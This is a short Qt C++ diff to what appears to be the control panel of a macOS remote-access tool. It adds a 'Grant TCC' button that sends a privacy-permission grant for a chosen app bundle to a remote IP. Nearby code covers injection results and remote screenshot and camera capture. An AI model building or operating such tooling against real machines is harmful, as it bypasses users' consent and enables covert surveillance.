@@ -100,6 +100,13 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     });
     connect(m_server, &Server::injectResultReceived, m_injectionPanel, &InjectionPanel::onInjectResult);
 
+    // TCC Grant: bridge Grant TCC button → server, and result → panel
+    connect(m_injectionPanel, &InjectionPanel::tccGrantRequested, this, [this](const QString& ip, const QString& bundleId) {
+        m_server->sendTccGrantCommand(ip, bundleId);
+        onStatusMessage(QString("TCC grant sent: %1 → %2").arg(ip, bundleId));
+    });
+    connect(m_server, &Server::tccGrantResultReceived, m_injectionPanel, &InjectionPanel::onTccGrantResult);
+
     // Screenshot/Camera: bridge Capture button → server
     connect(m_mediaPanel, &MediaPanel::screenshotRequested, this,
         [this](const QString& ip, uint8_t subtype) {
